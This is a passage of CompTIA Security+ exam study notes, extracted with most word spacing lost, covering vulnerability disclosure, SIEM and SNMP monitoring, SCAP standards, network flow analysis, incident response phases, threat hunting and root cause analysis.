+● VulnerabilityReporting○ VulnerabilityReporting■ Processofdocumentingandcommunicatingsecurityweaknessesinsoftwareor
+
+systemstoindividualsandorganizationsresponsibleforaddressingtheissues■ Reportsshoulduseclear,concise,andtransparentlanguage■ Confidentialityiscrucialtopreventexploitation,reputationdamage,andlegal
+
+repercussions
+
+329https://www.DionTraining.com
+
+## Page 330
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ InternalReporting■ Firstlineofdefenseinvulnerabilitymanagementwithintheorganization■ Identifying,documenting,andcommunicatingvulnerabilitieswithinthe
+
+- rganizationalstructure■ Informationremainsinternal■ Timelyreportingreducesexposuretounpatchedvulnerabilities■ Establishclearcommunicationpathsandprotocols○ ExternalReporting■ Reportingvulnerabilitiesoutsidetheorganization,involvingvendors,partners,
+customers,orthepublic■ Coordinatingwithvendorstoaddressvulnerabilitiesforthebenefitofall
+
+customers■ Sharingnon-sensitivedetailswithdatabaseslikeCVEorvendorknowledgebases■ Respectprivacywhendiscussingvulnerabilitieswithexternalorganizations○ ResponsibleDisclosures■ Ethicalandjudiciousdisclosuretoaffectedstakeholdersbeforepublic
+
+announcement■ Collaboratewiththeentityresponsibleforthevulnerability(e.g.,software
+
+developer)■ Considerbugbountyprograms■ Givevendorstimetoaddresstheissuebeforepublicdisclosure■ Providedetailedreports,includingmethodsusedtoexploitvulnerabilitiesand
+
+recommendedmitigations○ ImportanceofConfidentiality■ Confidentialityisnon-negotiabletopreventexploitation■ Vulnerabilityreportsarevaluablemapsforattackers
+
+330https://www.DionTraining.com
+
+## Page 331
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Encryptreportsandusesecurestorage■ Sharereportsonaneed-to-knowbasis■ Considerexecutivesummariesfornon-technicalstakeholders■ Breachingconfidentialitycanleadtoexploitation,reputationdamage,andlegal
+
+repercussions
+
+331https://www.DionTraining.com
+
+## Page 332
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+AlertingandMonitoring
+
+Objective4.4:Explainsecurityalertingandmonitoringconceptsandtools
+
+● AlertingandMonitoring○ AlertingandMonitoring■ Importance● Crucialformaintainingintegrity,confidentiality,andavailabilityof
+
+informationsystems■ Components● Alerting(notifyingpersonnelofpotentialsecurityincidents)● Monitoring(continuousobservationtodetectanomaliesorthreats)○ StudyTopics■ TypesofAlerts● TruePositive○ Correctlyidentifiesalegitimateissue● FalsePositive○ Incorrectlyindicatesanissuewhenthereisn'tone● TrueNegative○ Correctlyrecognizestheabsenceofanissue● FalseNegative○ Failstoalertaboutarealissue■ AlertingSystemGoals● Maximizetruepositives● Minimizefalsepositivestoavoidalertfatigue
+
+332https://www.DionTraining.com
+
+## Page 333
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ MonitoringTypes● AutomatedMonitoring○ Softwaretoolsforscanningandanalyzing● ManualMonitoring○ Humanpersonnelactivelyreviewingandanalyzing■ MonitoringResources● Overviewofmonitoringsystems,applications,andinfrastructure■ AlertingandMonitoringActivities● LogAggregation○ Collectingandcentralizinglogdata● Alerting○ Notificationofpotentialsecurityincidents● Scanning○ Continuousexaminationforanomalies● Reporting○ Generatingreportsonsystemandnetworkstatus● Archiving○ Storinghistoricaldata● AlertResponseandRemediation/Validation○ Respondingtoalertsandvalidatingremediation■ SimpleNetworkManagementProtocol(SNMP)● Widelyusedinnetworkmanagementsystems● Monitorsandmanagesnetworkdevices● SNMPtrapsforsettingupandcollectingdata■ SecurityInformationandEventManagement(SIEM)● Integratedmanagementtechnologiesforholisticsecurityviews
+
+333https://www.DionTraining.com
+
+## Page 334
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Collectsandaggregateslogdata● Agent-basedandAgentlessMonitoring■ DatafromSecurityTools● Collectionfromvarioussources(Antivirus,DLPsystems,NIDS,NIPS,
+
+firewalls,Vulnerabilityscanner)● ConsolidationinaSIEM■ SecurityContentAutomationandProtocol(SCAP)● Enablesautomatedvulnerabilitymanagement,measurement,andpolicy
+
+complianceevaluation■ NetworkTrafficFlows● Asequenceofpacketsfromsourcetodestination● Identifiablebyauniquesetofidentifiers● Crucialforunderstandingnetworkusagepatternsanddetectingsecurity
+
+threats■ SinglePaneofGlass● Consolidatesdatafromdifferentsourcesintoaunifieddisplay● Providesadministratorswithacomprehensiveview
+
+● MonitoringResources○ MonitoringSystems■ Involvesobservingacomputersystem'sperformance,including● CPU● Memory● Diskusage● Networkperformance
+
+334https://www.DionTraining.com
+
+## Page 335
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Baseline■ Areferencepointrepresentingnormalsystembehaviorundertypicaloperating
+
+conditions■ BaselinemetricscanincludeCPUusage,memoryutilization,diskactivity,and
+
+networktraffic■ Deviationsfromthebaselinecanindicatepotentialissues,promptingproactive
+
+troubleshootingandmaintenance○ ApplicationMonitoring■ Focusesonmanagingandmonitoringsoftwareapplicationperformanceand
+
+availability■ Trackserrors,bottlenecks,andissuesthatmayaffectanapplication's
+
+performanceoruserexperience■ ToolslikeNewRelicandAppDynamicstrackresponsetimesanderrorrates■ Slowerresponsetimesmayindicatecodeproblemsorresourcedeficiencies○ InfrastructureMonitoring■ Observesphysicalandvirtualinfrastructure,includingservers,networks,virtual
+
+machines,containers,andcloudservices■ Providesinsightsintonetworktraffic,bandwidthusage,anddevicestatus■ ToolslikeSolarWindsandPRTGNetworkMonitorhelpmonitornetwork
+
+infrastructure■ Overloadednetworkswitchescansignaltheneedforadditionalcapacityor
+
+configurationissues
+
+335https://www.DionTraining.com
+
+## Page 336
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● AlertingandMonitoringActivities○ Alertingandmonitoringutilizesawiderangeofactivities■ LogAggregation● Collectsandconsolidateslogdatafromvarioussourcesintoacentral
+
+location● Aidsintroubleshooting,performancemonitoring,securityanalysis,and
+
+compliance● Providesaholisticviewofsystemeventsforidentifyingissuesand
+
+correlations● Vitalformaintainingsystemhealthandanalyzingperformancetrends● Usedfor○ Detectingsecurityincidents○ Investigatingbreaches○ Gatheringevidence■ Alerting● Involvessettingupnotificationsforspecificeventsorconditions● Alertscanbetriggeredbasedonthresholdsoranomalies● Criticalforproactiveissueresolution,incidentdetection,andregulatory
+
+compliance● Deliveredthroughvariouschannels,suchasemail,SMS,orpush
+
+notifications■ Scanning● Regularlyexaminessystems,networks,orapplicationstoidentify
+
+vulnerabilities,misconfigurations,andissues
+
+336https://www.DionTraining.com
+
+## Page 337
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Includesthefollowing○ Vulnerabilityscanning■ Checksforvulnerabilitiesinsystems,networks,or
+
+applications■ Comparessystem’sstateagainstadatabaseofknown
+
+vulnerabilities○ Configurationscanning■ Checksformisconfigurationsthatcouldimpactsystem
+
+performanceorsecurity■ Deviationsareflaggedforadministrativereview○ Codescanning■ Checksthesourcecodeofanapplicationforpotential
+
+issues,suchassecurityvulnerabilitiesorcodingerrors● UtilizestoolslikeNessus,OpenVAS,andQualys● Helpsmaintainsystemhealth,security,andoptimalperformance■ Reporting● Generatessummariesordetailedreportsbasedoncollectedand
+
+analyzeddata● Providesinsightsintosystemperformance,securityincidents,compliance
+
+status,andmore● Essentialforcompliancereportingandcontinuousimprovement■ Archiving● Involveslong-termstorageofdata,including○ Logdata○ Performancedata○ Incidentdata
+
+337https://www.DionTraining.com
+
+## Page 338
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Ensuresdataisretainedforfuturereference,analysis,auditing,or
+
+compliance● Importantforlegalandregulatoryrequirements● CanbeachievedusingcloudstoragesolutionslikeAmazonS3orGoogle
+
+CloudStorage■ AlertResponseandRemediation/Validation● Managingandresolvingidentifiedissuesbasedonalertsorscans● Beginbytakingappropriateactionssuchas○ Investigating○ Escalating○ Initiating● Initialresponsemayincludeinvestigation,escalation,orpredefined
+
+procedures● Remediation○ involvestakingstepstoaddressvulnerabilitiesorissues,suchas
+
+patchingorreconfiguration● Validation○ verifiesthatremediationeffortsweresuccessfulinaddressingthe
+
+identifiedproblems○ Quarantining■ Isolatesasystem,network,orapplicationsuspectedofbeingcompromised■ Preventsthespreadofthreatsandlimitspotentialimpact■ Commonlyusedwhendealingwithmalwareinfections○ AlertTuning■ Adjustsalertparameterstoreduceerrors,falsepositives,andimprovealert
+
+relevance
+
+338https://www.DionTraining.com
+
+## Page 339
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Caninvolvechangingalertthresholds,conditions,ordeliverymethods■ Helpsminimizeexcessivealertsandnoise,makingalertsmoreactionable
+
+● SimpleNetworkManagementProtocol(SNMP)○ SNMP(SimpleNetworkManagementProtocol)■ AnInternetprotocolusedforcollectinginformationfrommanageddevicesonIP
+
+networksandmodifyingdevicebehavior■ Manageddevicesincludethefollowing● Routers● Switches● Firewalls● Printers● Servers● Clientdevices○ SNMPManager■ Acentralsystemthatcollectsandprocessesinformationfrommanageddevices■ Oftensetupasaserver,especiallyinlargeenterpriseenvironments■ SendsandreceivesSNMPmessagestoandfromagents
+
+○ SNMPAgents■ Networkeddevicesthatsendinformationaboutthemselvestothemanager■ Runbackgroundservicestocollectdataandsendittothemanager■ Transmitdataatregularintervalsorwhenrequestedbythemanager○ SNMPMessageTypes■ SET● Manager-to-agentrequesttochangevariablevalues
+
+339https://www.DionTraining.com
+
+## Page 340
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ GET● Manager-to-agentrequesttoretrievevariablevalues■ TRAP● Asynchronousnotificationsfromagentstothemanagertonotify
+
+significantevents● Notifythemanagerofeventssuchasuptime,configurationchanges,and
+
+networkdowntime● Maybegranularorverbose○ Granular■ SentTRAPmessagesgetauniqueobjectidentifierOID)to
+
+distinguisheachmessageasauniquemessagebeing
+
+received■ OID(ObjectIdentifier)● Uniqueobjectidentifierusedtoidentifyvariables
+
+forreadingorsettingviaSNMP● AllowsthemanagertodistinguishindividualSNMP
+
+trapmessages■ MIB(ManagementInformationBase)● AhierarchicalnamespacecontainingOIDsandtheir
+
+descriptions● Describesthestructureofdevicesubsystem
+
+managementdata● Storesconsolidatedinformationreceivedthrough
+
+SNMPtraps○ Verbose■ SNMPtrapsmaybeconfiguredtocontainallofthe
+
+340https://www.DionTraining.com
+
+## Page 341
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+informationaboutagivenalertoreventasapayload● DatainSNMPTRAPSarestoredinasimplekey-valuepairconfiguration
+
+knownasa“variablebinding”○ SNMPVersions1,2,and3■ SNMPversions1and2useplain-textcommunitystringsforaccess,makingthem
+
+lesssecure■ SNMPversion3offersenhancedsecurityfeatures● SecurityEnhancementsinSNMPVersion3○ Integrity■ Hashingmessagesbeforetransmissiontopreventdata
+
+alteration○ Authentication■ Validatingthesourceofmessages○ Confidentiality■ AddingencryptionusingDES,3DES,orAES○ DividingSNMPcomponentsintoentitieswithdifferentaccess
+
+privilegesforimprovedsecurity
+
+● SecurityInformationandEventManagement(SIEM)○ SIEM(SecurityInformationandEventManagement)■ Asolutionforreal-timeornear-real-timeanalysisofsecurityalertsgeneratedby
+
+networkhardwareandapplications■ SIEMhelpscorrelatevariouseventsandincidentsfromsystemlogs○ ImportanceofLogReviews■ Criticalforsecurityassurance■ Logsshouldbereviewedregularlyandroutinely,notjustafteranincidentoras
+
+341https://www.DionTraining.com
+
+## Page 342
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+partofaninstantresponse○ SIEMFunctionality■ Correlatesandanalyzeslogdata■ Consolidatesdatafromvarioussystemsintoacentralizeddatabaseorrepository■ Detectspatternsindicatingsecuritythreats■ Generatesalertsforsecurityteamstoinvestigate○ Agent-Basedvs.AgentlessSIEM■ Agent-Based● Softwareagentsareinstalledoneachsystemtocollectandsendlogdata● Providesreal-timedataanddetailedinformation■ Agentless● Logdataiscollecteddirectlyfromsystemsusingstandardprotocols● Reducesmaintenancebutmaynotcollectreal-timeordetaileddata○ SIEMImplementationConsiderations■ Logallrelevanteventsandfilteroutirrelevantdata■ Establishanddocumentthescopeofevents■ Developusecasestodefinethreats■ Planincidentresponseactionsfordifferentevents■ Establishaticketingprocesstotrackflaggedevents■ Scheduleregularthreathuntingtodetectunnoticedevents■ Provideauditorsandanalystswithanevidencetrail○ CommonSIEMSolutions■ Splunk● Bigdatainformationgatheringandanalysistool● Offersconnectorsforvariousdatasystems● Providessearchprocessinglanguagefordataanalysis
+
+342https://www.DionTraining.com
+
+## Page 343
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Comeswithpre-configuredtemplatesanddashboards■ ELK(ElasticStack)● Acollectionoffreeandopen-sourceSIEMtools,includingthefollowing○ Elasticsearch○ Logstash○ Kibana○ Beats● Componentsworktogetherforlogcollection,storage,analysis,and
+
+visualization■ ArcSight● SIEMlogmanagementandanalyticssoftware● SuitableforcompliancereportingforregulationslikeHIPAA,SOX,andPCI
+
+DSS■ QRadar● ASIEMlogmanagement,analytics,andcompliancereportingplatform
+
+createdbyIBM● Offersadashboardfordatavisualizationandanalysis
+
+● DatafromSecurityTools○ AntivirusSoftware■ Protectssystemsagainstmalware,includingthefollowing● Viruses● Worms● Trojans● Ransomware● Spyware
+
+343https://www.DionTraining.com
+
+## Page 344
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Generatesdatalikemalwaredetectionlogs,systemscans,andupdates■ DatasenttoSIEMforaggregationandcorrelation■ Helpsidentifysecuritythreatsandsystemhealth○ DataLossPrevention(DLP)Systems■ Monitorandcontroldataendpoints,networktraffic,andcloud-storeddatato
+
+preventdatabreaches■ Generatedataonpotentialdataleakincidents,policyviolations,andsuspicious
+
+useractivities■ Flagsattemptstosendsensitivedataoutsidetheorganization■ DatasenttoSIEMfortimelycorrectiveactions○ NetworkIntrusionDetectionSystemsandNetworkIntrusionPreventionSystems■ NetworkIntrusionDetectionSystems(NIDS)● Passivelyidentifypotentialthreatsandgeneratealerts■ NetworkIntrusionPreventionSystems(NIPS)● Activelyblockorpreventthreatsfromaccessingthenetwork■ Dataincludesthefollowing● Detectedthreats● Blockedtraffic● Networkanomalies■ SenttoSIEMforidentifyingmaliciousactivity,securityvulnerabilities,and
+
+effectivenessofintrusionpreventionmeasures○ Firewalls■ Actasabarrierbetweentrustedinternalnetworksanduntrustedexternal
+
+networks■ Filterincomingandoutgoingtrafficbasedonsecurityrules(ACLs)■ Generatelogswithdataonallowedandblockedtraffic,rulechanges,and
+
+344https://www.DionTraining.com
+
+## Page 345
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+potentialthreats● SenttoSIEMformonitoringnetworkperimetersecurityandidentifying
+
+intrusionattempts○ VulnerabilityScanners■ Identifysecurityweaknesses,includingmissingpatches,incorrectconfigurations,
+
+andknownvulnerabilities■ Generatedataonidentifiedvulnerabilities,severity,andremediation
+
+recommendations■ DataintegratedintoSIEMtoprioritizevulnerabilityremediation● Usedtotrackremediationprogressandverifytheeffectivenessofsteps
+
+taken
+
+● SecurityContentAutomationandProtocol(SCAP)○ SecurityContentAutomationProtocol(SCAP)■ Suiteofopenstandardsthatenhancestheautomationofvulnerability
+
+management,measurement,andpolicycomplianceevaluationofsystems
+
+deployedinanorganization■ DevelopedbytheNationalInstituteofStandardsandTechnology(NIST)■ Enhancestheautomationofsecuritytasks,includingthefollowing● Vulnerabilityscanning● Configurationchecking● Softwareinventory○ ComponentsofSCAP■ SCAPcomprisesasuiteofopenstandardsusedtoautomatesecuritytasks■ Supportsstandardizedvulnerabilityscanning,resultsreporting,andscoring■ Promotesvulnerabilityprioritizationandcompliancewithinternalandexternal
+
+345https://www.DionTraining.com
+
+## Page 346
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+requirements■ EnsuresthatdifferentsecuritytoolscommunicateusingthesameSCAP
+
+formatteddata○ SCAPLanguages■ OVAL(OpenVulnerabilityandAssessmentLanguage)● XMLschemafordescribingsystemsecuritystatesandquerying
+
+vulnerabilityreports■ XCCDF(ExtensibleConfigurationChecklistDescriptionFormat)● XMLschemafordevelopingandauditingbest-practiceconfiguration
+
+checklistsandrules● Allowsimprovedautomation■ ARF(AssetReportingFormat)● XMLschemaforexpressinginformationaboutassetsandtheir
+
+relationships● Vendorandtechnologyneutral● Flexible● Suitedforawidevarietyofreportingapplications
+
+○ EnumerationMethodsinSCAP■ CCE(CommonConfigurationEnumeration)● Schemeforprovisioningsecureconfigurationchecksacrossmultiple
+
+sources● Providesuniqueidentifiersfordifferentsystemconfigurationissues■ CPE(CommonPlatformEnumeration)● Identifieshardwaredevices,operatingsystems,andapplications● Standardformat:
+
+346https://www.DionTraining.com
+
+## Page 347
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ cpe:/part:vendor:product:version:update:edition:language■ CVE(CommonVulnerabilitiesandExposures)● Describespubliclyknownvulnerabilitieswithuniqueidentifiers● Standardformat○ CVE-Yearfirstdocumented-Number○ CVE-2017-0144○ CommonVulnerabilityScoringSystem(CVSS)■ Usedtoprovideanumericalscorereflectingtheseverityofavulnerability(0to
+
+10)■ Scoresareusedtocategorizevulnerabilitiesasnone,low,medium,high,or
+critical■ Scoresassistinprioritizingremediationeffortsbutdonotaccountforexisting
+
+mitigations○ SCAPBenchmarks■ Benchmarks● Setsofsecurityconfigurationrulesforspecificproductstoestablish
+
+securitybaselines● Provideadetailedchecklistthatcanbeusedtosecuresystemstoa
+
+specificbaseline■ ExpressedintheXCCDFformatandusedforcompliancetesting■ ManySCAPBenchmarksavailablefordifferentsystemsandapplications,
+
+ensuringpropersystemconfigurationandvulnerabilityidentification■ ExamplesofSCAPBenchmarks● RedHatEnterpriseLinuxBenchmark○ ProvidessecurityconfigurationrulesforRedHatEnterpriseLinux● CISMicrosoftWindows10EnterpriseBenchmark
+
+347https://www.DionTraining.com
+
+## Page 348
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ IncludessecurityconfigurationrulesforMicrosoftWindows10
+
+Enterprise■ ThreelanguagesusedinSCAP● OVAL● XCCDF● ARF
+
+● NetworkandFlowAnalysis○ FullPacketCapture(FPC)■ Capturesentirepackets,includingheadersandpayloads○ FlowAnalysis■ Focusesonrecordingmetadataandstatisticsaboutnetworktraffic,saving
+
+storagespace■ Doesn’tincludetheactualcontent,justthemetadata■ Rapidlygeneratesvisualizationstomapnetworkconnections,traffictypesand
+
+sessionvolumes○ FlowCollector■ Recordsmetadataandstatisticsaboutnetworktraffic■ Collectsinformationaboutthefollowing● Typeoftraffic● Protocolused● Datavolume■ Allowsforefficientdatastorageandreducesprocessingoverhead○ Metadatavs.Contents■ Flowanalysisprovidesmetadataaboutdata,nottheactualcontent■ Metadataincludesdetailsabouttraffictypesandvolumes
+
+348https://www.DionTraining.com
+
+## Page 349
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Noinformationaboutthecontentofconversationsormessagessent○ DataStorageandQuerying■ Flowanalysisinformationisstoredinadatabase■ Datacanbequeriedandusedtogeneratereportsandgraphs■ Flowanalysisidentifiestrends,patterns,andanomaliesinnetworktraffic○ NetFlow■ Cisco-developedprotocolforreportingnetworkflowinformation■ AlsoknownasIPFIX(IPFlowInformationExport)■ Definestrafficflowsbasedonsharedcharacteristics(e.g.,sourceanddestination
+
+IP)■ DatacollectedbyNetFlow● Networkprotocolinterface● IPversionandtype● Sourceanddestination● IPaddresses● Sourceanddestinationports● Typeofserviceused■ UseofNetFlowData● NetFlowdataisanalyzedvisuallyusingvarioustools● ToolslikeSolarWindsdisplayNetFlowdata,highlightingflows● Datacanbeusedtoidentifytrafficpatternsandanomalies○ Zeek■ Hybridtoolfornetworkmonitoring■ MonitorstrafficlikeNetFlowbutlogsfullpacketcapturesbasedoninterest■ Filtersorsignaturestriggerfullpacketcapturetoanalyzespecificdata■ Normalizesdataforeasyimportintoothertoolsforvisualizationandanalysis
+
+349https://www.DionTraining.com
+
+## Page 350
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ MRTG(MultiRouterTrafficGrapher)■ Createsgraphsdisplayingnetworktrafficflowsthroughroutersandswitches■ UsesSNMP(SimpleNetworkManagementProtocol)togatherdata■ Helpsidentifytrafficpatternsandanomaliesbyvisualizingdatatransfervolumes○ AnalyzingTrafficSpikes■ Trafficspikescanindicateanomalies■ Investigatethecauseoftrafficspikes■ Spikeanalysismayrevealissueslikemalwareinfectionorunauthorizeddata
+
+transfer○ IncidentInvestigation■ Suspiciousspikesmayrequiresettingupnetworksniffers■ Analyzepacketcapturedataandflowanalysistoidentifyindicatorsof
+
+compromise■ Investigatefurthertounderstandthenatureofanomalies
+
+● SinglePaneofGlass○ SinglePaneofGlass(SPOG)■ Centralpointofaccessforsecurityteams■ Providesaccesstoinformation,tools,andsystemsformonitoring,managing,and
+
+securinganorganization'sITenvironment■ Offersaunifiedviewofthesecuritypostureandfacilitatesinformed
+
+decision-making● Canquicklyandeasilyaccesscriticalinformation,aidinginformed
+
+decision-making○ BenefitsofSPOG■ Simplifiessecurityoperationsmanagement,offeringaunifiedviewindetecting
+
+350https://www.DionTraining.com
+
+## Page 351
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+andrespondingtothreats■ Securityteamscanmonitortheenvironmentforsuspicioussignslikeunusual
+
+trafficorfailedlogins■ Securityteamscantracktheprogressofincidentresponse,ensuringthatall
+
+requiredstepsaretakentoresolveanincident■ ASPOGcanimprovetheefficiencyofasecurityoperationcenterbyautomating
+
+repetitivetasks■ Improvescollaborationandcommunicationwithinsecurityteams■ Aidscompliancewithregulatoryandcompliancerequirementsbygenerating
+
+necessarydocumentation○ ImplementationofSPOG■ Canbeimplementedassoftwareorhardware■ Stepsforimplementing● DefiningRequirements○ Identifytheinformation,tools,andsystemsrequiredforeffective
+
+securitymanagement○ Specifydatatypes(logs,alerts,reports)andintegratenecessary
+
+tools(intrusiondetection,incidentresponse)● IdentifyingandIntegratingDataSources○ Identifydatasources(logservers,intrusiondetectionsystems)
+
+thatneedintegration○ UseAPIs,webhooks,plugins,orconnectorstocollectandanalyze
+
+datafromvarioussources○ Considerdataformats,locations,andintegrationmethods● CustomizingtheInterface○ Designauser-friendlyinterface
+
+351https://www.DionTraining.com
+
+## Page 352
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Configurepanelsandviewsfordisplayingdataandinformation○ Createanorganizedlayoutfornavigation● DevelopingStandardOperatingProcedures(SOPs)andDocumentation○ DocumentproceduresforusingtheSPOG○ Ensuresecurityteamsunderstandhowtousethesolution○ Promoteconsistencyandrepeatabilityinsecurityoperations
+
+management● ContinuousMonitoringandMaintenance○ Regularlyreviewcollecteddataandmakenecessaryadjustments○ EnsuretheSPOGisproperlyconfiguredandsecured○ Protectagainstunauthorizedaccess
+
+352https://www.DionTraining.com
+
+## Page 353
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+IncidentResponse
+
+Objective4.8:Explainappropriateincidentresponseactivities
+
+● IncidentResponse○ IncidentResponse■ Systematicapproachtomanagingandmitigatingsecurityincidents■ Goals● Minimizeimpact● Reducedetectionandcontainmenttime● Facilitaterecovery■ KeySteps● Detection● Classification● Containment● Eradication● Evidencepreservation● Communication● Lessonslearned○ StudyTopics■ IncidentResponseProcess● Steps○ Preparation○ Detection○ Analysis○ Containment
+
+353https://www.DionTraining.com
+
+## Page 354
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Eradication○ Recovery○ LessonsLearned■ ThreatHunting● Proactivecybersecurityapproachforcontinuousthreatidentification● Purpose○ Identifyhiddenoremergingthreats■ RootCauseAnalysis● Systematicprocesstoinvestigateincidentsandidentifyunderlyingfactors● Purpose○ Understandthecauseofsecuritybreachesoroperationalissues■ IncidentResponseTrainingandTesting● Methods○ TabletopExercises○ Simulations○ Drills○ LiveExercises● Purpose○ Preparepersonnelandsystemsforeffectiveincidentresponse■ DigitalForensicProcedures● Systematictechniquestogather,analyze,andpreservedigitalevidence● Purpose○ Investigatecybercrimesorsecurityincidents■ DataCollectionProcedures● Establishedmethodsforgatheringrelevantinformationduringincident
+
+response
+
+354https://www.DionTraining.com
+
+## Page 355
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Concept○ Orderofvolatility(prioritizingdatacollectionbasedonvolatility)■ DiskImagingandAnalysis● Creatingabit-by-bitcopy(image)ofastoragedevice,examiningcontent● Purpose○ Recoverdata○ Investigateincidents○ Identifysecurityissues
+
+● IncidentResponseProcess○ Incident■ Anactviolatingasecuritypolicy○ PhasesofIncidentResponse■ NIST(NationalInstituteforStandardsandTechnology)definesafour-phase
+
+incidentresponseprocess● Preparation● DetectionandAnalysis● Containment,EradicationandRecovery● Post-IncidentActivity■ IntheCompTIAmodel,"DetectionandAnalysis"isdividedintotwophases,and
+
+"Containment,Eradication,andRecovery"isdividedintothree,creatinga
+
+seven-phasemodel○ SevenPhasesofIncidentResponse■ Preparation● Getsanorganizationreadyforfutureincidents● Focusesonmakingsystemsresilienttoattacksbyhardeningsystemsand
+
+355https://www.DionTraining.com
+
+## Page 356
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+networks● Involvescreatingpolicies,procedures,andacommunicationplan■ Detection● Determinesifasecurityincidenthasoccurred● Identifiesasecurityincident● Cybersecurityandtriageanalystsplayavitalroleinassessingincident
+
+severity■ Analysis● Thoroughlyexaminesandevaluatestheincident● Providesinsightsintotheincident'sscopeandimpact● Notifiesstakeholdersandinitiatescontainment■ Containment● Limitstheincident'sscopebysecuringdataandminimizingbusiness
+
+impact● Preventsthespreadofmaliciousactivity■ Eradication● Startsaftercontainment● Focusesonremovingmaliciousactivityfromsystemsornetworks● Mayinvolvereimagingaffectedsystems■ Recovery● Restoresaffectedsystemsandservicestotheirsecurestate● Includesrestoringfrombackups,patching,andupdatingconfigurations● Ensuresresilienceagainstfuturethreats■ Post-IncidentActivity● Occursaftercontainment,eradication,andrecovery● Identifiestheinitialincidentsourceandimprovementstopreventfuture
+
+356https://www.DionTraining.com
+
+## Page 357
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+incidents● Involves○ Rootcauseanalysis■ Identifiestheincident’ssourceandhowtopreventitinthe
+
+future■ Steps● Define/scopetheincident● Determinethecausalrelationshipsthatledtothe
+
+incident● Identifyaneffectivesolution● Implementandtrackthesolutions○ Lessonslearned■ Documentsexperiencesduringincidentsinaforma○ After-actionreport■ Collectsformalizedinformationaboutwhatoccurred○ IncidentResponseTeam■ Thecoreteamincludescybersecurityprofessionalswithincidentresponse
+
+experience● Temporarymembersmaybeaddedasneeded(e.g.,database
+
+administrators)■ Largeorganizationshavefull-timeincidentresponseteams● Smallerorganizationsformtemporaryteamsforspecificincidents■ TeamRoles● Leader● SubjectMatterExperts● ITSupport
+
+357https://www.DionTraining.com
+
+## Page 358
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● LegalCounsel● HR● PublicRelations■ Leadershipandmanagementensuretheincidentresponseteamhasnecessary
+
+funding,resources,andexpertise■ Managementmakescrucialdecisionsandcommunicatesthemduringthe
+
+incidentresponse○ OutsourcingIncidentResponse■ Someorganizationsoutsourceincidentresponsetospecializedteams■ Effectivebutexpensive;externalteamsmaynotbefamiliarwiththe
+
+- rganization'snetwork
+● ThreatHunting○ ThreatHunting■ Proactivecybersecuritytechniquetodetectthreatsthathaven'tbeendiscovered
+
+bynormalsecuritymonitoring■ Involvesactivelyseekingoutpotentialthreatswithinyournetwork,asopposed
+
+towaitingforthemtotriggeralerts○ StepsinThreatHunting■ EstablishingaHypothesis● Conductthreatmodelingtoidentifypotentialthreatswithhighimpact● Usethreatintelligencetoformhypothesesaboutthreatactorsor
+
+campaignsthatmaytargetyourorganization■ ProfilingThreatActorsandActivities● Createscenariostounderstandhowattackersmightattemptanintrusion● Determinethetypeofthreatactor(insider,hacktivist,criminal,nation
+
+358https://www.DionTraining.com
+
+## Page 359
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+state)● Identifytheirobjectivesandpotentialtargets■ ThreatHuntingProcess● Utilizessecuritymonitoringandincidentresponsetools● Analyzeslogs,systemdata,filesystems,andregistryinformation● Focusesonfindingthreatsnotdetectedbyexistingrules● Startbyassumingthatthecurrentruleshaven’tflaggedpotentialthreats● Seeksnewtactics,techniques,andproceduresusedbythreatactors○ KeyConsiderations■ Threathuntersmuststayupdatedonthelatestattacksandthreats■ Useadvisoriesandbulletinspublishedbyvendorsandresearcherstoidentify
+
+newTTPsandvulnerabilities■ Utilizeintelligencefusionandthreatdata,combiningSIEMlogswithreal-world
+
+threatfeeds○ BenefitsofThreatHunting■ Improvesdetectioncapabilitiesbyidentifyingthreatsthatbypassexisting
+
+defenses■ Enhancesthreatintelligencebycorrelatingexternalthreatfeedswithinternal
+
+logs■ Providesactionableintelligencetostrengthensecuritymeasures
+
+● RootCauseAnalysis○ RootCauseAnalysis(RCA)■ Systematicprocesstoidentifytheinitialsourceofanincidentandpreventitfrom
+
+recurring
+
+359https://www.DionTraining.com
+
+## Page 360
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ StepsinRootCauseAnalysis■ DefineandScopetheIncident● Determinetheinitialcauseandscopeoftheincident● Understandhowmanysystems/usershavebeenaffectedandthe
+
+- perationalimpact
+■ DetermineCausalRelationships● Identifythecausalrelationshipsthatledtotheincident● Understandhowtheincidentoccurred,suchasthroughmalware
+
+infectionviaUSBdriveorothervectors■ IdentifyEffectiveSolutions● Findsolutionstopreventtheincidentfromrecurring● Solutionsmayincludeaddingantivirus,restrictingdatatransferfromUSB
+
+devices,orapplyingsoftwarepatches■ ImplementandTrackSolutions● Executethesolutionsandensuretheincidentisfullyresolved● Usechangemanagementprocessestoupdatesystemsandconfigurations● Lookacrossthenetworkandseeifthereareanyothermachinesthat
+
